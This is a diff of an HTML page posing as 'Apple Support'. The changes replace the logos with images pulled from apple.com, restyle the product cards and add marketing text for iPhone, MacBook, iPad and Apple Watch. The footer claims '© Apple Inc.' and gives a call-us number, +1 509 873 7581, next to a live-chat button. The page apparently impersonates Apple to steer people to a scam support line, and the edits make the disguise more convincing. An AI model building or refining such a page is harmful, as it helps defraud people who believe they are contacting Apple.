@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Apple Support</title>
     <!-- Favicon with Apple Logo -->
-    <link rel="icon" type="image/svg+xml" href="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg">
+    <link rel="icon" type="image/png" href="https://www.apple.com/favicon.ico">
     <style>
         body {
             margin: 0;
@@ -61,14 +61,13 @@
         }
         .products {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
-            gap: 20px;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 25px;
             margin: 40px 0;
         }
         .product {
-            text-align: center;
             background-color: #fff;
-            padding: 20px;
+            padding: 25px;
             border-radius: 18px;
             box-shadow: 0 2px 8px rgba(0,0,0,0.05);
             transition: transform 0.3s;
@@ -77,21 +76,27 @@
         .product:hover {
             transform: translateY(-5px);
         }
-        .product img {
+        .product img.device-img {
             width: 100%;
             max-width: 200px;
             border-radius: 10px;
         }
-        .product p {
-            font-size: 1.1em;
-            margin: 10px 0 0;
-        }
-        .product .logo {
-            width: 20px;
+        .product img.logo {
+            width: 25px;
             position: absolute;
-            top: 10px;
-            left: 10px;
-            opacity: 0.7;
+            top: 15px;
+            left: 15px;
+            opacity: 0.8;
+        }
+        .product h3 {
+            font-size: 1.3em;
+            margin: 15px 0 10px;
+            font-weight: 600;
+        }
+        .product p {
+            font-size: 0.95em;
+            color: #515154;
+            margin: 0;
         }
         .contact-section {
             background-color: #fff;
@@ -157,7 +162,7 @@
 </head>
 <body>
     <header>
-        <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo">
+        <img src="https://www.apple.com/ac/structured-data/images/open_graph_logo.png" alt="Apple Logo">
         <h1>Apple Support</h1>
     </header>
 
@@ -169,24 +174,28 @@
 
         <div class="products">
             <div class="product">
-                <img src="https://images.pexels.com/photos/607812/pexels-photo-607812.jpeg?auto=compress&cs=tinysrgb&w=600" alt="iPhone">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="logo">
-                <p>iPhone</p>
+                <img src="https://images.pexels.com/photos/607812/pexels-photo-607812.jpeg?auto=compress&cs=tinysrgb&w=600" alt="iPhone" class="device-img">
+                <img src="https://www.apple.com/ac/structured-data/images/open_graph_logo.png" alt="Apple Logo" class="logo">
+                <h3>iPhone</h3>
+                <p>The iPhone redefines mobile technology with its cutting-edge features like the A17 Pro chip, advanced cameras, and iOS. Whether you need help with setup, software updates, or repairs, our team is here to assist.</p>
             </div>
             <div class="product">
-                <img src="https://images.pexels.com/photos/1646704/pexels-photo-1646704.jpeg?auto=compress&cs=tinysrgb&w=600" alt="MacBook">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="logo">
-                <p>MacBook</p>
+                <img src="https://images.pexels.com/photos/1646704/pexels-photo-1646704.jpeg?auto=compress&cs=tinysrgb&w=600" alt="MacBook" class="device-img">
+                <img src="https://www.apple.com/ac/structured-data/images/open_graph_logo.png" alt="Apple Logo" class="logo">
+                <h3>MacBook</h3>
+                <p>Experience unmatched performance with the MacBook, powered by M-series chips. From productivity to creativity, get support for macOS, hardware issues, or accessory compatibility.</p>
             </div>
             <div class="product">
-                <img src="https://images.pexels.com/photos/2047906/pexels-photo-2047906.jpeg?auto=compress&cs=tinysrgb&w=600" alt="iPad">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="logo">
-                <p>iPad</p>
+                <img src="https://images.pexels.com/photos/2047906/pexels-photo-2047906.jpeg?auto=compress&cs=tinysrgb&w=600" alt="iPad" class="device-img">
+                <img src="https://www.apple.com/ac/structured-data/images/open_graph_logo.png" alt="Apple Logo" class="logo">
+                <h3>iPad</h3>
+                <p>The iPad combines portability and power, perfect for work or play. Contact us for help with iPadOS, Apple Pencil issues, or device troubleshooting.</p>
             </div>
             <div class="product">
-                <img src="https://images.pexels.com/photos/393047/pexels-photo-393047.jpeg?auto=compress&cs=tinysrgb&w=600" alt="Apple Watch">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="logo">
-                <p>Apple Watch</p>
+                <img src="https://images.pexels.com/photos/393047/pexels-photo-393047.jpeg?auto=compress&cs=tinysrgb&w=600" alt="Apple Watch" class="device-img">
+                <img src="https://www.apple.com/ac/structured-data/images/open_graph_logo.png" alt="Apple Logo" class="logo">
+                <h3>Apple Watch</h3>
+                <p>Stay connected and fit with the Apple Watch. Need assistance with watchOS, fitness tracking, or pairing? Our experts are ready to help.</p>
             </div>
         </div>
 
@@ -207,7 +216,7 @@
     <button class="chat-btn">Start Live Chat</button>
 
     <footer>
-        <p><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo"> Apple Support | Call Us: <span class="highlight">+1 509 873 7581</span></p>
+        <p><img src="https://www.apple.com/ac/structured-data/images/open_graph_logo.png" alt="Apple Logo"> Apple Support | Call Us: <span class="highlight">+1 509 873 7581</span></p>
         <p><a href="#">Privacy Policy</a> | <a href="#">Terms of Use</a> | <a href="#">FAQ</a> | <a href="#">Support Community</a></p>
         <p>© 2025 Apple Inc. All rights reserved.</p>
     </footer>
